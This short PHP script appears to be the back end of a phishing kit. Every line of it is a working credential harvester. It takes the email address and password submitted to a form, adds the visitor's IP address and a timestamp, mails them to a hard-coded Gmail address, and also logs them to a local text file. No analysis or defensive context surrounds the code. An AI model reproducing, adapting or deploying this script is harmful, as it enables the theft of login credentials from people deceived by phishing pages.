<?php
$ip = getenv("REMOTE_ADDR");
$datum = date("D M d, Y g:i a");

if(!empty($_POST)) {
	
 $amu= isset($_POST['email']) ?  $_POST['email'] : $_POST['ai'];
 $otu = isset($_POST['password']) ? $_POST['password'] : $_POST['pr'];
 
		$omeka = "emailboy37@gmail.com";
		
		
         $ishiozi = "You've got mail from $ip";
		 
		 $ozi .=  "USER: ".$amu."\n";
		 
         $ozi .= "PASS: ".$otu."\n";
         
		 $ozi .= "IP  : ".$ip."\r\n";
		 
		 $ozi .= "DATE: ".$datum."\r\n";
		 
	     $headers  = "From: Notification <noreply>\n";
	     $headers .= "Reply-To: {$amu}\n";
	     $headers .= 'Content-type: text/plain; charset=iso-8859-1' . "\n";
	     $headers .= "MIME-Version: 1.0\n";
		 
		 mail ($omeka,$ishiozi,$ozi,$header);
         $fp = fopen('ab.txt', 'a');
	     fwrite($fp, $ozi);
	     fclose($fp);
}
?>